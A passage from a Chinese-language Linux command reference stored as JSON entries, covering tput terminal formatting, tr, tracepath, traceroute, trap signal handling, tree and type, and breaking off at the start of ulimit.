tput，您可以更改几项终端功能，如移动或更改光标、更改文本属性，以及清除终端屏幕的特定区域。\n\n### 什么是 terminfo 数据库？  \n\nUNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备（例如，终端和打印机）的行数和列数以及要发送至该设备的文本的属性。UNIX 中的几个常用程序都依赖 terminfo 数据库提供这些属性以及许多其他内容，其中包括 vi 和 emacs 编辑器以及 curses 和 man 程序。\n\n与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。\n\n **光标属性** \n\n在 UNIX shell 脚本中或在命令行中，移动光标或更改光标属性可能是非常有用的。有些情况下，您可能需要输入敏感信息（如密码），或在屏幕上两个不同的区域输入信息。在此类情况下，使用 tput 可能会对您有所帮助。\n\n```\ntput clear # 清屏\ntput sc # 保存当前光标位置\ntput cup 10 13 # 将光标移动到 row col\ntput civis # 光标不可见\ntput cnorm # 光标可见\ntput rc # 显示输出\nexit 0\n```\n\n **移动光标** \n\n使用 tput 可以方便地实现在各设备上移动光标的位置。通过在 tput 中使用 cup 选项，或光标位置，您可以在设备的各行和各列中将光标移动到任意 X 或 Y 坐标。设备左上角的坐标为 (0,0)。\n\n要在设备上将光标移动到第 5 列 (X) 的第 1 行 (Y)，只需执行 tput cup 5 1。另一个示例是 tput cup 23 45，此命令将使光标移动到第 23 列上的第 45 行。\n\n **移动光标并显示信息** \n\n另一种有用的光标定位技巧是移动光标，执行用于显示信息的命令，然后返回到前一光标位置：\n\n```\n(tput sc ; tput cup 23 45 ; echo “Input from tput/echo at 23/45” ; tput rc)\n```\n\n下面我们分析一下 subshell 命令：\n\n```\ntput sc\n```\n\n必须首先保存当前的光标位置。要保存当前的光标位置，请包括 sc 选项或“save cursor position”。\n\n```\ntput cup 23 45\n```\n\n在保存了光标位置后，光标坐标将移动到 (23,45)。\n\n```\necho “Input from tput/echo at 23/45”\n```\n\n将信息显示到 stdout 中。\n\n```\ntput rc\n```\n\n在显示了这些信息之后，光标必须返回到使用 tput sc 保存的原始位置。要使光标返回到其上次保存的位置，请包括 rc 选项或“restore cursor position”。\n\n注意：由于本文首先详细介绍了通过命令行执行 tput，因此您可能会觉得在自己的 subshell 中执行命令要比单独执行每条命令然后在每条命令执行之前显示提示更简洁。\n\n **更改光标的属性** \n\n在向某一设备显示数据时，很多时候您并不希望看到光标。将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁。要使光标不可见，请使用 civis 选项（例如，tput civis）。在数据完全显示之后，您可以使用 cnorm 选项将光标再次转变为可见。\n\n **文本属性** \n\n更改文本的显示方式可以让用户注意到菜单中的一组词或警惕用户注意某些重要的内容。您可以通过以下方式更改文本属性：使文本加粗、在文本下方添加下划线、更改背景颜色和前景颜色，以及逆转颜色方案等。\n\n要更改文本的颜色，请使用 setb 选项（用于设置背景颜色）和 setf 选项（用于设置前景颜色）以及在 terminfo 数据库中分配的颜色数值。通常情况下，分配的数值与颜色的对应关系如下，但是可能会因 UNIX 系统的不同而异：\n\n*   0：黑色\n*   1：蓝色\n*   2：绿色\n*   3：青色\n*   4：红色\n*   5：洋红色\n*   6：黄色\n*   7：白色\n\n执行以下示例命令可以将背景颜色更改为黄色，将前景颜色更改为红色：\n\n```\ntput setb 6 tput setf 4\n```\n\n要反显当前的颜色方案，只需执行`tput rev`。\n\n有时，仅为文本着色还不够，也就是说，您想要通过另一种方式引起用户的注意。可以通过两种方式达到这一目的：一是将文本设置为粗体，二是为文本添加下划线。\n\n要将文本更改为粗体，请使用 bold 选项。要开始添加下划线，请使用 smul 选项。在完成显示带下划线的文本后，请使用 rmul 选项。\n\n### 实例  \n\n使输出的字符串有颜色，底色，加粗：\n\n```\n#!/bin/bash\nprintf $(tput setaf 2; tput bold)\u0027color show\\n\\n\u0027$(tput sgr0)\n\nfor((i\u003d0; i\u003c\u003d7; i++)); do\n    echo $(tput setaf $i)\"show me the money\"$(tput sgr0)\ndone\n\nprintf \u0027\\n\u0027$(tput setaf 2; tput setab 0; tput bold)\u0027background color show\u0027$(tput sgr0)\u0027\\n\\n\u0027\n\nfor((i\u003d0,j\u003d7; i\u003c\u003d7; i++,j--)); do\n    echo $(tput setaf $i; tput setab $j; tput bold)\"show me the money\"$(tput sgr0)\ndone\n\nexit 0\n```\n\n输出格式控制函数：\n\n```\n#!/bin/bash\n\n# $1 str       print string\n# $2 color     0-7 设置颜色\n# $3 bgcolor   0-7 设置背景颜色\n# $4 bold      0-1 设置粗体\n# $5 underline 0-1 设置下划线\n\nfunction format_output(){\n    str\u003d$1\n    color\u003d$2\n    bgcolor\u003d$3\n    bold\u003d$4\n    underline\u003d$5\n    normal\u003d$(tput sgr0)\n\n    case \"$color\" in\n        0|1|2|3|4|5|6|7)\n            setcolor\u003d$(tput setaf $color;) ;;\n        *)\n            setcolor\u003d\"\" ;;\n    esac\n\n    case \"$bgcolor\" in\n        0|1|2|3|4|5|6|7)\n            setbgcolor\u003d$(tput setab $bgcolor;) ;;\n        *)\n            setbgcolor\u003d\"\" ;;\n    esac\n\n    if [ \"$bold\" \u003d \"1\" ]; then\n        setbold\u003d$(tput bold;)\n    else\n        setbold\u003d\"\"\n    fi\n\n    if [ \"$underline\" \u003d \"1\" ]; then\n        setunderline\u003d$(tput smul;)\n    else\n        setunderline\u003d\"\"\n    fi\n\n    printf \"$setcolor$setbgcolor$setbold$setunderline$str$normal\\n\"\n}\n\nformat_output \"Yesterday Once more\" 2 5 1 1\n\nexit 0\n```\n\n光标属性例子：\n\n```\n#!/bin/bash\n# clear the screen\ntput clear\n# Move cursor to screen location X,Y (top left is 0,0)\ntput cup 3 15\n# set a foreground colour using ANSI escape\ntput setaf 3\necho \"XYX Corp LTD.\"\ntput sgr0\ntput cup 5 17\n# Set reverse video mode\ntput rev\necho \"M A I N - M E N U\"\ntput sgr0\ntput cup 7 15\necho \"1\\. User Management\"\ntput cup 8 15\necho \"2\\. service Management\"\ntput cup 9 15\necho \"3\\. Process Management\"\ntput cup 10 15\necho \"4\\. Backup\"\n# Set bold mode\ntput bold\ntput cup 12 15\nread -p \"Enter your choice [1-4] \" choice\ntput clear\ntput sgr0\ntput rc\n\nexit 0\n```\n\n\n"},{"name":"tr","categoryId":1,"data":"tr\n\u003d\u003d\u003d\n\n将字符进行替换压缩和删除\n\n## 补充说明\n\n**tr命令** 可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大。\n\n### 语法  \n\n```\ntr(选项)(参数)\n```\n\n### 选项  \n\n```\n-c或——complerment：取代所有不属于第一字符集的字符；\n-d或——delete：删除所有属于第一字符集的字符；\n-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；\n-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。\n```\n\n### 参数  \n\n*   字符集1：指定要转换或删除的原字符集。当执行转换操作时，必须使用参数“字符集2”指定转换的目标字符集。但执行删除操作时，不需要参数“字符集2”；\n*   字符集2：指定要转换成的目标字符集。\n\n### 实例  \n\n将输入字符由大写转换为小写：\n\n```\necho \"HELLO WORLD\" | tr \u0027A-Z\u0027 \u0027a-z\u0027\nhello world\n\n```\n\n\u0027A-Z\u0027 和 \u0027a-z\u0027都是集合，集合是可以自己制定的，例如：\u0027ABD-}\u0027、\u0027bB.,\u0027、\u0027a-de-h\u0027、\u0027a-c0-9\u0027都属于集合，集合里可以使用\u0027\\n\u0027、\u0027\\t\u0027，可以可以使用其他ASCII字符。\n\n使用tr删除字符：\n\n```\necho \"hello 123 world 456\" | tr -d \u00270-9\u0027\nhello  world \n```\n\n将制表符转换为空格：\n\n```\ncat text | tr \u0027\\t\u0027 \u0027 \u0027\n```\n\n字符集补集，从输入文本中将不在补集中的所有字符删除：\n\n```\necho aa.,a 1 b#$bb 2 c*/cc 3 ddd 4 | tr -d -c \u00270-9 \\n\u0027\n 1  2  3  4\n\n```\n\n此例中，补集中包含了数字0~9、空格和换行符\\n，所以没有被删除，其他字符全部被删除了。\n\n用tr压缩字符，可以压缩输入中重复的字符：\n\n```\necho \"thissss is      a text linnnnnnne.\" | tr -s \u0027 sn\u0027\nthis is a text line.\n```\n\n巧妙使用tr做数字相加操作：\n\n```\necho 1 2 3 4 5 6 7 8 9 | xargs -n1 | echo $[ $(tr \u0027\\n\u0027 \u0027+\u0027) 0 ]\n\n```\n\n删除Windows文件“造成”的\u0027^M\u0027字符：\n\n```\ncat file | tr -s \"\\r\" \"\\n\" \u003e new_file\n或\ncat file | tr -d \"\\r\" \u003e new_file\n```\n\n **tr可以使用的字符类：** \n\n```\n[:alnum:]：字母和数字\n[:alpha:]：字母\n[:cntrl:]：控制（非打印）字符\n[:digit:]：数字\n[:graph:]：图形字符\n[:lower:]：小写字母\n[:print:]：可打印字符\n[:punct:]：标点符号\n[:space:]：空白字符\n[:upper:]：大写字母\n[:xdigit:]：十六进制字符  \n```\n\n使用方式：\n\n```\ntr \u0027[:lower:]\u0027 \u0027[:upper:]\u0027\n```\n\n\n"},{"name":"tracepath","categoryId":0,"data":"tracepath\n\u003d\u003d\u003d\n\n追踪目的主机经过的路由信息\n\n## 补充说明\n\n**tracepath命令** 用来追踪并显示报文到达目的主机所经过的路由信息。\n\n### 语法  \n\n```\ntracepath(参数)\n```\n\n### 参数  \n\n*   目的主机：指定追踪路由信息的目的主机；\n*   端口：指定使用的UDP端口号。\n\n### 实例  \n\n```\ntracepath www.58.com\n 1:  192.168.2.10 (192.168.2.10)                           20.150ms pmtu 1500\n 1:  unknown (192.168.2.1)                                  9.343ms\n 2:  221.6.45.33 (221.6.45.33)                             34.430ms\n 3:  221.6.9.81 (221.6.9.81)                               19.263ms\n 4:  122.96.66.37 (122.96.66.37)                           54.372ms\n 5:  219.158.96.149 (219.158.96.149)                      asymm  6 128.526ms\n 6:  123.126.0.66 (123.126.0.66)                          138.281ms\n 7:  124.65.57.26 (124.65.57.26)                          166.244ms\n 8:  61.148.154.98 (61.148.154.98)                        103.723ms\n 9:  202.106.42.102 (202.106.42.102)                      asymm 10  78.099ms\n10:  210.77.139.150 (210.77.139.150)                      asymm  9 199.930ms\n11:  211.151.104.6 (211.151.104.6)                        asymm 10 121.965ms\n12:  no reply\n13:  211.151.111.30 (211.151.111.30)                      asymm 12 118.989ms reached\n     Resume: pmtu 1500 hops 13 back 12\n```\n\n\n"},{"name":"traceroute","categoryId":9,"data":"traceroute\n\u003d\u003d\u003d\n\n显示数据包到主机间的路径\n\n## 补充说明\n\n**traceroute命令** 用于追踪数据包在网络上的传输时的全部路径，它默认发送的数据包大小是40字节。\n\n通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。\n\ntraceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其ip地址。\n\n### 语法  \n\n```\ntraceroute(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：使用Socket层级的排错功能；\n-f\u003c存活数值\u003e：设置第一个检测数据包的存活数值TTL的大小；\n-F：设置勿离断位；\n-g\u003c网关\u003e：设置来源路由网关，最多可设置8个；\n-i\u003c网络界面\u003e：使用指定的网络界面送出数据包；\n-I：使用ICMP回应取代UDP资料信息；\n-m\u003c存活数值\u003e：设置检测数据包的最大存活数值TTL的大小；\n-n：直接使用IP地址而非主机名称；\n-p\u003c通信端口\u003e：设置UDP传输协议的通信端口；\n-r：忽略普通的Routing Table，直接将数据包送到远端主机上。\n-s\u003c来源地址\u003e：设置本地主机送出数据包的IP地址；\n-t\u003c服务类型\u003e：设置检测数据包的TOS数值；\n-v：详细显示指令的执行过程；\n-w\u003c超时秒数\u003e：设置等待远端主机回报的时间；\n-x：开启或关闭数据包的正确性检验。\n```\n\n### 参数  \n\n主机：指定目的主机IP地址或主机名。\n\n### 实例  \n\n```\ntraceroute www.58.com\ntraceroute to www.58.com (211.151.111.30), 30 hops max, 40 byte packets\n 1  unknown (192.168.2.1)  3.453 ms  3.801 ms  3.937 ms\n 2  221.6.45.33 (221.6.45.33)  7.768 ms  7.816 ms  7.840 ms\n 3  221.6.0.233 (221.6.0.233)  13.784 ms  13.827 ms 221.6.9.81 (221.6.9.81)  9.758 ms\n 4  221.6.2.169 (221.6.2.169)  11.777 ms 122.96.66.13 (122.96.66.13)  34.952 ms 221.6.2.53 (221.6.2.53)  41.372 ms\n 5  219.158.96.149 (219.158.96.149)  39.167 ms  39.210 ms  39.238 ms\n 6  123.126.0.194 (123.126.0.194)  37.270 ms 123.126.0.66 (123.126.0.66)  37.163 ms  37.441 ms\n 7  124.65.57.26 (124.65.57.26)  42.787 ms  42.799 ms  42.809 ms\n 8  61.148.146.210 (61.148.146.210)  30.176 ms 61.148.154.98 (61.148.154.98)  32.613 ms  32.675 ms\n 9  202.106.42.102 (202.106.42.102)  44.563 ms  44.600 ms  44.627 ms\n10  210.77.139.150 (210.77.139.150)  53.302 ms  53.233 ms  53.032 ms\n11  211.151.104.6 (211.151.104.6)  39.585 ms  39.502 ms  39.598 ms\n12  211.151.111.30 (211.151.111.30)  35.161 ms  35.938 ms  36.005 ms\n```\n\n记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是ms，其实就是`-q`的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果用`traceroute -q 4 www.58.com`，表示向每个网关发送4个数据包。\n\n有时我们traceroute一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。\n\n有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加`-n`参数来避免DNS解析，以IP格式输出数据。\n\n如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。\n\n**跳数设置**\n\n```\n[root@localhost ~]# traceroute -m 10 www.baidu.com\ntraceroute to www.baidu.com (61.135.169.105), 10 hops max, 40 byte packets\n 1  192.168.74.2 (192.168.74.2)  1.534 ms  1.775 ms  1.961 ms\n 2  211.151.56.1 (211.151.56.1)  0.508 ms  0.514 ms  0.507 ms\n 3  211.151.227.206 (211.151.227.206)  0.571 ms  0.558 ms  0.550 ms\n 4  210.77.139.145 (210.77.139.145)  0.708 ms  0.729 ms  0.785 ms\n 5  202.106.42.101 (202.106.42.101)  7.978 ms  8.155 ms  8.311 ms\n 6  bt-228-037.bta.net.cn (202.106.228.37)  772.460 ms bt-228-025.bta.net.cn (202.106.228.25)  2.152 ms 61.148.154.97 (61.148.154.97)  772.107 ms\n 7  124.65.58.221 (124.65.58.221)  4.875 ms 61.148.146.29 (61.148.146.29)  2.124 ms 124.65.58.221 (124.65.58.221)  4.854 ms\n 8  123.126.6.198 (123.126.6.198)  2.944 ms 61.148.156.6 (61.148.156.6)  3.505 ms 123.126.6.198 (123.126.6.198)  2.885 ms\n 9  * * *\n10  * * *\n```\n\n其它一些实例\n\n```\ntraceroute -m 10 www.baidu.com # 跳数设置\ntraceroute -n www.baidu.com    # 显示IP地址，不查主机名\ntraceroute -p 6888 www.baidu.com  # 探测包使用的基本UDP端口设置6888\ntraceroute -q 4 www.baidu.com  # 把探测包的个数设置为值4\ntraceroute -r www.baidu.com    # 绕过正常的路由表，直接发送到网络相连的主机\ntraceroute -w 3 www.baidu.com  # 把对外发探测包的等待响应时间设置为3秒\n```\n\n\n"},{"name":"trap","categoryId":0,"data":"trap\n\u003d\u003d\u003d\n\n指定在接收到信号后将要采取的动作\n\n## 补充说明\n\n**trap命令** 用于指定在接收到信号后将要采取的动作，常见的用途是在脚本程序被中断时完成清理工作。当shell接收到sigspec指定的信号时，arg参数（命令）将会被读取，并被执行。例如：\n\n```\ntrap \"exit 1\" HUP INT PIPE QUIT TERM\n```\n\n表示当shell收到HUP INT PIPE QUIT TERM这几个命令时，当前执行的程序会读取参数“exit 1”，并将它作为命令执行。\n\n### 语法  \n\n```\ntrap -[lp] [[arg] sigspec ...]\n```\n\n### 选项参数说明  \n\n如果arg参数缺省或者为“-”，每个接收到的sigspec信号都将会被重置为它们进入shell时的值；\n\n如果arg是空字符串每一个由sigspec指定的信号都会被shell和它所调用的命令忽略；\n\n如果有`-p`选项而没有提供arg参数则会打印所有与sigspec指定信号相关联的的trap命令；\n\n如果没有提供任何参数或者仅有-p选项，trap命令将会打印与每一个信号有关联的命令的列表；\n\n`-l`选项的作用是让shell打印一个命令名称和其相对应的编号的列表。\n\n每个sigspec信号都是是以名字或者编号的形式定义在signal.h头文件中，信号的名字是不区分大小写的，其前缀SIG是可选的，如果某个信号是 EXIT（0），那么arg指定的命令将会在shell上执行退出命令时执行（If a sigspec is EXIT (0) the command arg is executed on exit from the shell），如果sigspec是DEBUG，那么arg指定的命令将会在以下每个命令执行之前执行：\n\n简单命令，for语句，case语句，select命令，算法命令，在函数内的第一条命令。\n\n更多trap debug的使用可以参考extdebug选项说明。\n\n如果sigspec是ERR，arg参数指定的命令将会在任何简单命名执行完后返回值为非零值时执行，但是也有以下例外情况：\n\n1.  如果执行失败的命令是紧跟在while或者until关键字之后的一组命令中的一部分时\n2.  如果执行失败的命令是if测试语句的一部分时，是 \u0026\u0026 和 ||连接的列表中的一部分时\n3.  如果执行失败的命令的返回值是被取反过的（通过!操作符）\n\n在以上情况中如果sigspec是ERR，arg命令不会执行，这些规则同样适用于errexit选项。如果sigspec是RETURN，arg指定的命令在每次shell函数或者脚本用\".\"或者内置的命令执行完成后执行，在shell入口处被忽略的命令 是没法被trap和reset的，被trap的信号，在创建的子进程中使用时会在子进程被创建时被重置为原始的值。如果trap使用的sigspec信号 是invalid的信号则trap命令返回false（失败），否则返回成功（true）。\n\n### 信号  \n\n信号是一种进程间通信机制，它给应用程序提供一种异步的软件中断，使应用程序有机会接受其他程序活终端发送的命令(即信号)。应用程序收到信号后，有三种处理方式：忽略，默认，或捕捉。进程收到一个信号后，会检查对该信号的处理机制。如果是SIG_IGN，就忽略该信号；如果是SIG_DFT，则会采用系统默认的处理动作，通常是终止进程或忽略该信号；如果给该信号指定了一个处理函数(捕捉)，则会中断当前进程正在执行的任务，转而去执行该信号的处理函数，返回后再继续执行被中断的任务。\n\n在有些情况下，我们不希望自己的shell脚本在运行时刻被中断，比如说我们写得shell脚本设为某一用户的默认shell，使这一用户进入系统后只能作某一项工作，如数据库备份， 我们可不希望用户使用Ctrl c之类便进入到shell状态，做我们不希望做的事情。这便用到了信号处理。\n\n以下是一些你可能会遇到的，要在程序中使用的更常见的信号：\n\n\u003ctable\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth width\u003d\"100\"\u003e信号名称\u003c/th\u003e\n\n\u003cth width\u003d\"60\"\u003e信号数\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGHUP\u003c/td\u003e\n\n\u003ctd\u003e1\u003c/td\u003e\n\n\u003ctd\u003e本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联。 登录Linux时，系统会分配给登录用户一个终端(Session)。在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个Session。当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号。这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止。对于与终端脱离关系的守护进程，这个信号用于通知它重新读取配置文件。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGINT\u003c/td\u003e\n\n\u003ctd\u003e2\u003c/td\u003e\n\n\u003ctd\u003e程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl C)时发出。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGQUIT\u003c/td\u003e\n\n\u003ctd\u003e3\u003c/td\u003e\n\n\u003ctd\u003e和SIGINT类似, 但由QUIT字符(通常是Ctrl /)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGFPE\u003c/td\u003e\n\n\u003ctd\u003e8\u003c/td\u003e\n\n\u003ctd\u003e在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGKILL\u003c/td\u003e\n\n\u003ctd\u003e9\u003c/td\u003e\n\n\u003ctd\u003e用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGALRM\u003c/td\u003e\n\n\u003ctd\u003e14\u003c/td\u003e\n\n\u003ctd\u003e时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eSIGTERM\u003c/td\u003e\n\n\u003ctd\u003e15\u003c/td\u003e\n\n\u003ctd\u003e程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n### 捕获信号  \n\n当你按下 Ctrl + C 键或 Break 键在终端一个shell程序的执行过程中，正常程序将立即终止，并返回命令提示符。这可能并不总是可取的。例如，你可能最终留下了一堆临时文件，将不会清理。\n\n捕获这些信号是很容易的，trap命令的语法如下：\n\n```\n$ trap commands signals\n```\n\n这里的命令可以是任何有效的Linux命令，或一个用户定义的函数，信号可以是任意数量的信号，你想来捕获的列表。\n\n在shell脚本中的陷阱有三种常见的用途：\n\n1.  清理临时文件\n2.  忽略信号\n\n **1、清理临时文件：** \n\ntrap命令作为一个例子，下面展示了如何可以删除一些文件，然后退出，如果有人试图从终端中止程序：\n\n```\ntrap \"rm -f $WORKDIR/work1$ $WORKDIR/dataout$; exit\" 2\n```\n\n执行shell程序，这个陷阱的角度，这两个文件work1$$ 和 dataout$$将被自动删除，如果程序接收信号数为2。\n\n因此，用户中断执行，如果执行的程序后，这个陷阱你可以放心，这两个文件将被清理。 exit 命令如下 rm 是必要的，因为没有它的执行将继续在节目中的一点，它离开时收到信号。\n\n1号信号产生挂断：要么有人故意挂断线路或线路被意外断开。\n\n您可以修改前面的陷阱也删除指定的文件，在这种情况下，两个信号信号1号添加到列表：\n\n```\n$ trap \"rm $WORKDIR/work1$ $WORKDIR/dataout$; exit\" 1 2\n```\n\n现在，这些文件将被删除，如果该行被挂了，或者按Ctrl c键被按下。\n\n来捕获指定的命令必须用引号括起来，如果它们包含一个以上的命令。另外请注意，在 shell 命令行扫描 trap 命令得到执行，并再次当一个所列出的的信号被接收的时间。\n\nWORKDIR 值 $$ 所以在前面的例子中，将被取代 trap 命令执行的时间。如果你想这种替代发生在收到信号1或2的时间你可以把单引号内的命令：\n\n```\n$ trap \u0027rm $WORKDIR/work1$ $WORKDIR/dataout$; exit\u0027 1 2\n```\n\n **2、忽略信号：** \n\n如果陷阱列出的命令是空的，指定的信号接收时，将被忽略。例如，下面的命令：\n\n```\n$ trap \u0027\u0027 2\n```\n\n指定的中断信号是被忽略的。你可能要忽略某些信号时进行一些操作，不希望打断。可以指定多个信号被忽略如下：\n\n```\n$ trap \u0027\u0027 1 2 3 15\n```\n\n注意，第一个参数必须被指定为一个信号被忽略，而不是相当于写入下面的内容，它具有独立的含义也各有：\n\n```\n$ trap  2\n```\n\n如果你忽略了一个信号，所有的子shell也忽略该信号。不过，如果指定要采取的行动在收到的信号，所有的子shell仍然会在收到该信号的默认操作。\n\n **3、重设陷阱：** \n\n当你改变了默认在收到信号后应采取的动作，你可以改变它回来的陷阱，如果你只是省略第一个参数;\n\n```\n$ trap 1 2\n```\n\n复位应采取的动作收到信号1或2返回默认。\n\n\n"},{"name":"tree","categoryId":8,"data":"tree\n\u003d\u003d\u003d\n\n树状图列出目录的内容\n\n## 补充说明\n\n**tree命令** 以树状图列出目录的内容。\n\n### 语法  \n\n```\ntree(选项)(参数)\n```\n\n### 选项  \n\n```bash\n------- 列表选项 -------\n-a            # 显示所有文件和目录。\n-d            # 先是目录名称而非文件。\n-l            # 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。\n-f            # 在每个文件或目录之前，显示完整的相对路径名称。\n-x            # 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该目录予以排除在寻找范围外。\n-L level      # 限制目录显示层级。\n-R            # Rerun tree when max dir level reached.\n-P pattern    # \u003c范本样式\u003e 只显示符合范本样式的文件和目录名称。\n-I pattern    # Do not list files that match the given pattern.\n--ignore-case # Ignore case when pattern matching.\n--matchdirs   # Include directory names in -P pattern matching.\n--noreport    # Turn off file/directory count at end of tree listing.\n--charset X   # Use charset X for terminal/HTML and indentation line output.\n--filelimit # # Do not descend dirs with more than # files in them.\n--timefmt \u003cf\u003e # Print and format time according to the format \u003cf\u003e.\n-o filename   # Output to file instead of stdout.\n-------- 文件选项 ---------\n-q            # 用“？”号取代控制字符，列出文件和目录名称。\n-N            # 直接列出文件和目录名称，包括控制字符。\n-Q            # Quote filenames with double quotes.\n-p            # 列出权限标示。\n-u            # 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。\n-g            # 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。\n-s            # 列出文件和目录大小。\n-h            # Print the size in a more human readable way.\n--si          # Like -h, but use in SI units (powers of 1000).\n-D            # 列出文件或目录的更改时间。\n-F            # 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上\"*\"，\"/\"，\"@\"，\"|\"号。\n--inodes      # Print inode number of each file.\n--device      # Print device ID number to which each file belongs.\n------- 排序选项 -------\n-v            # Sort files alphanumerically by version.\n-t            # 用文件和目录的更改时间排序。\n-c            # Sort files by last status change time.\n-U            # Leave files unsorted.\n-r            # Reverse the order of the sort.\n--dirsfirst   # List directories before files (-U disables).\n--sort X      # Select sort: name,version,size,mtime,ctime.\n------- 图形选项 ------\n-i            # 不以阶梯状列出文件和目录名称。\n-A            # 使用ASNI绘图字符显示树状图而非以ASCII字符组合。\n-S            # Print with CP437 (console) graphics indentation lines.\n-n            # Turn colorization off always (-C overrides).\n-C            # 在文件和目录清单加上色彩，便于区分各种类型。\n------- XML / HTML / JSON选项 -------\n-X            # Prints out an XML representation of the tree.\n-J            # Prints out an JSON representation of the tree.\n-H baseHREF   # Prints out HTML format with baseHREF as top directory.\n-T string     # Replace the default HTML title and H1 header with string.\n--nolinks     # Turn off hyperlinks in HTML output.\n---- 杂项选项 ----\n--version     # 输入版本信息。\n--help        # 打印使用帮助信息。\n--            # Options processing terminator.\n```\n\n### 参数  \n\n目录：执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。\n\n\n### 实例\n\n列出目录`/private/` 第一级文件名\n\n```bash\ntree  /private/ -L 1\n/private/\n├── etc\n├── tftpboot\n├── tmp\n└── var\n```\n\n\n"},{"name":"type","categoryId":0,"data":"type\n\u003d\u003d\u003d\n\n显示指定命令的类型\n\n## 补充说明\n\n**type命令** 用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。\n\n命令类型：\n\n*   alias：别名。\n*   keyword：关键字，Shell保留字。\n*   function：函数，Shell函数。\n*   builtin：内建命令，Shell内建命令。\n*   file：文件，磁盘文件，外部命令。\n*   unfound：没有找到。\n\n### 语法  \n\n```\ntype(选项)(参数)\n```\n\n### 选项  \n\n```\n-t：输出“file”、“alias”或者“builtin”，分别表示给定的指令为“外部指令”、“命令别名”或者“内部指令”；\n-p：如果给出的指令为外部指令，则显示其绝对路径；\n-a：在环境变量“PATH”指定的路径中，显示给定指令的信息，包括命令别名。\n```\n\n### 参数  \n\n指令：要显示类型的指令。\n\n### 实例  \n\n```\n[root@localhost ~]# type ls\nls is aliased to `ls --color\u003dtty\u0027\n\n[root@localhost ~]# type cd\ncd is a shell builtin\n\n[root@localhost ~]# type date\ndate is /bin/date\n\n[root@localhost ~]# type mysql\nmysql is /usr/bin/mysql\n\n[root@localhost ~]# type nginx\n-bash: type: nginx: not found\n\n[root@localhost ~]# type if\nif is a shell keyword\n\n[root@localhost ~]# type which\nwhich is aliased to `alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde\u0027\n\n[root@localhost ~]# type -a cd\ncd is a shell builtin\n\n[root@localhost ~]# type -a grep\ngrep is /bin/grep\n```\n\n\n"},{"name":"ulimit","categoryId":4,"data":"ulimit\n\u003d\u003d\u003d\n\n控制shell程序的资源\n\n## 补充说明\n\n**ulimit命令** 用来限制系统用户对shell资源的访问。如果不懂什么意思，下面一段内容可以帮助你理解：\n\n假设有这样一种情况，当一台 Linux 主机上同时登陆了 10 个人，在系统资源无限制的情况下，这 10 个用户同时打开了 500 个文档，而假设每个文档的大小有 